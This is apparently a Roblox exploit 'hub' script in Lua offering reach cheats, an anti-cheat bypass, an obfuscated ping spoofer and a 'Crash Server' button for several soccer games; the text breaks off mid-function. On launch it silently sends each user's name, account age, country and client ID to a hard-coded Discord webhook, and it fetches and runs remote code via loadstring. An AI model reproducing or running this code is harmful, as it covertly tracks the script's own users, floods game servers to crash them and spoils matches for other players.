---key with webhook
---also made by me

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")

local function getHWID()
    local computerName = ""
    pcall(function() computerName = string.lower(os.getenv("COMPUTERNAME")) end)

    local volumeSerialNumber = ""
    pcall(function()
        local drive = string.sub(os.getenv("SystemDrive"), 1, 1)
        local handle = io.popen("vol " .. drive .. ":")
        volumeSerialNumber = string.match(handle:read("*a"), "%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+")
        handle:close()
    end)

    local macAddress = ""
    pcall(function()
        local adapters = game:GetService("NetworkAdapter").GetAdapters()
        table.sort(adapters, function(a, b) return a.Name < b.Name end)
        macAddress = adapters[1].MacAddress
    end)

    local hwidString = computerName .. volumeSerialNumber .. macAddress
    return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
end

local request = http_request or request or (syn and syn.request)

request({
    Method = "POST",
    Url = "https://discord.com/api/webhooks/1073932506224656394/2DtYtEiwwIRb_y_sxytrcn7-dCk8B0YFWNSdtf7V0yT3GjEroG8-gFcgSBZ0oQhTvTy5",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        username = "Logs",
        embeds = {
            {
                title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
                color = 0xFF0000, -- red color code
                fields = {
                    { name = "Place ID", value = game.PlaceId },
                    { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
                    { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
                    { name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
                }
            }
        }
    })
})

wait(1)

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "MPS HUB Key System", HidePremium = false, SaveConfig = true, IntroText = "MPS Key System"})

OrionLib:MakeNotification({
    Name = "Logged in",
    Content = "Welcome! "..Player.Name.."." ,
    Image = "rbxassetid://4483345998",
    Time = 5
})

_G.Key = "LXXMXXTXXD-KXXEXXYXX" -- Change key here
_G.KeyInput = "string" -- Change what you want the textbox of where you enter the key to say without clicking it

local Key = Window:MakeTab({
    Name = "Key System",
    Icon = "rbxassetid://4483345998", -- Your able to change this to any image you want
    PremiumOnly = false
})

function MakeScriptHub()
local lc = game:GetService("Players").LocalPlayer -- Use GetService it is important because some games change Players so use that instead of game.Players!
local group = 16807529 -- Roblox Fan Group but put your group ID HERE
local grouplink = "https://www.roblox.com/groups/16807529/Scripts-Clothing-Server#!/about"

if lc:IsInGroup(group) then -- IS In group is the roblox API Reference pretty self explanatory 

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("MPS GUI", "Midnight")

local Tab = Window:NewTab("Information")
local Section = Tab:NewSection("Made By KEREM42DNMZ , TeoxTR And Russian")

--------------------------------------------------------------


local Tab = Window:NewTab("Anti Cheat")
local Section = Tab:NewSection("MPS 4-A-SIDE Legacy")
Section:NewButton("Bypass", "ButtonInfo", function()
    print("Clicked")

game:GetService"RunService".RenderStepped:Connect(function()
game:GetService("Players").LocalPlayer.Backpack.Pass.G:Destroy()
end)

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        local args = {...}
        local method = getnamecallmethod()

        if tostring(self) == "remote1" and method == "FireServer" then
            args[1] = wait(9e9)
            return self.FireServer(self, unpack(args))
end
return OldNamecall(self, ...)
end)

end)
---------------------------------------------------------------------------

local Tab = Window:NewTab("Mps Scripts")
local Section = Tab:NewSection("Reach")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")

_G.BallName = "TPS"
_G.Magnitude = 5
_G.Enabled = true
-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end)
---------------------------------------------------------

Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)

end )

------------------------------------------------------------------
local Section = Tab:NewSection("Reach Keybind")
Section:NewKeybind("Open", "Open", Enum.KeyCode.K, function()
	_G.BallName = "TPS"
_G.Magnitude = 7
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)



end)

Section:NewKeybind("Close", "Close", Enum.KeyCode.L, function()
	_G.BallName = "TPS"
_G.Magnitude = 0
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)



end)

local Section = Tab:NewSection("Reach Slider")
Section:NewSlider("Slider", "pro", 100, 0, function(s) -- 100 (MaxValue) | 0 (MinValue)
    _G.BallName = "TPS"
_G.Magnitude = s
_G.Enabled = true


-- DONT TOUCH ANYTHING BELOW THIS

_G.Path = nil

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local left = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
                             if _G.Path == nil then
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetDescendants()) do
                        if balls.Name == _G.BallName then
                                _G.Path = balls.Parent
                        if (balls.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls, 0)
firetouchinterest(torso, balls, 0)
firetouchinterest(left, balls, 0)
firetouchinterest(leg, balls, 0)
firetouchinterest(head, balls, 0)
wait()
firetouchinterest(arm, balls, 1)
firetouchinterest(torso, balls, 1)
firetouchinterest(left, balls, 1)
firetouchinterest(leg, balls, 1)
firetouchinterest(head, balls, 1)
end
end
end
end
elseif _G.Path ~= nil then
        if _G.Enabled == true then
    for i, balls2 in pairs(_G.Path:GetChildren()) do
                          if balls2.Name == _G.BallName then
                                              if (balls2.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(arm, balls2, 0)
firetouchinterest(torso, balls2, 0)
firetouchinterest(left, balls2, 0)
firetouchinterest(leg, balls2, 0)
firetouchinterest(head, balls2, 0)
wait()
firetouchinterest(arm, balls2, 1)
firetouchinterest(torso, balls2, 1)
firetouchinterest(left, balls2, 1)
firetouchinterest(leg, balls2, 1)
firetouchinterest(head, balls2, 1)
               end
            end
        end
        end
end
end)


setsimulationradius(math.huge, math.huge)
end)

-------------------------------------------------------------


-------------------------------------------------------------------------

local Section = Tab:NewSection("Ping")
Section:NewButton("%40 Works", "Made by rus ab", function()
loadstring("\119\97\105\116\40\49\41\10\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\83\99\114\105\112\116\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\108\105\101\110\116\80\105\110\103\34\41\32\116\104\101\110\10\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\80\108\97\121\101\114\83\99\114\105\112\116\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\108\105\101\110\116\80\105\110\103\34\41\58\68\101\115\116\114\111\121\40\41\10\101\108\115\101\10\32\32\32\32\112\114\105\110\116\40\34\82\101\97\100\121\32\116\111\32\103\111\34\41\10\101\110\100\10\10\10\108\111\99\97\108\32\109\105\110\78\117\109\32\61\32\48\10\10\108\111\99\97\108\32\109\97\120\78\117\109\32\61\32\49\48\10\10\10\10\10\10\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\119\97\105\116\40\49\41\10\32\32\32\32\10\32\32\32\32\108\111\99\97\108\32\112\105\110\103\110\117\109\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\109\105\110\78\117\109\44\32\109\97\120\78\117\109\41\10\32\32\32\32\10\32\32\32\32\103\97\109\101\46\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\46\69\118\101\110\116\115\46\85\112\100\97\116\101\80\105\110\103\58\70\105\114\101\83\101\114\118\101\114\40\112\105\110\103\110\117\109\41\10\101\110\100\10")()
end)

-------------------------------------------------------------------------

local Section = Tab:NewSection("Crash Server")
Section:NewButton("Crash", "Made by rus ab", function()
_G.on = true --// toggle

while wait(1.0) do --// don't change it's the best
   if _G.on == true then
   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
   local function getmaxvalue(val)
      local mainvalueifonetable = 499999
      if type(val) ~= "number" then
          return nil
      end
      local calculateperfectval = (mainvalueifonetable/(val+2))
      return calculateperfectval
   end

   local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}

    table.insert(spammedtable, {})
    z = spammedtable[1]

    for i = 1, tableincrease do
       local tableins = {}
       table.insert(z, tableins)
       z = tableins
    end

    local calculatemax = getmaxvalue(tableincrease)
    local maximum

    if calculatemax then
        maximum = calculatemax
        else
        maximum = 10000
    end

    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end

    for i = 1, tries do
        game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
    end
   end

   bomb(250, 10) --// change values if client crashes
end
   end
end)

---------------------------------------------------------------

local Tab = Window:NewTab("Leagues")
local Section = Tab:NewSection("PSML/UFA")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 10
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)
------------------


Section:NewButton("Disable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 0
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

setsimulationradius(math.huge, math.huge)

end)

------------------------------------------------------

local Section = Tab:NewSection("TRS Public")
Section:NewButton("Enable", "ButtonInfo", function()
    print("Clicked")
-- h

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

_G.Magnitude = 10
_G.Enabled = true -- Set this to false if you want to disable the script

local leg = game.Players.LocalPlayer.Character["Right Leg"]
local leg2 = game.Players.LocalPlayer.Character["Left Leg"]
local LArm = game.Players.LocalPlayer.Character["Left Arm"]
local arm = game.Players.LocalPlayer.Character["Right Arm"]
local torso = game.Players.LocalPlayer.Character.Torso
local head = game.Players.LocalPlayer.Character.Head


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function()
    if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
                            if balls:IsA("BasePart") or balls:IsA("Part") then
                                if balls.Size == Vector3.new(2.5,2.5,2.5) then
                            local ball = balls
                             if (ball.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= _G.Magnitude then
firetouchinterest(ball, leg, 0)
firetouchinterest(ball, leg2, 0)
firetouchinterest(ball, torso,  0)
firetouchinterest(ball, head, 0)
firetouchinterest(ball, arm, 0)
wait()
firetouchinterest(ball, leg, 1)
firetouchinterest(ball, leg2, 1)
firetouchinterest(ball, torso,  1)
firetouchinterest(ball, head, 1)
firetouchinterest(ball, arm, 1)
end
end
end
end
end
end)

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
            mouse.Button1Down:Connect(function()
if _G.Enabled == true then
for i, balls in pairs(game.Workspace:GetChildren()) do
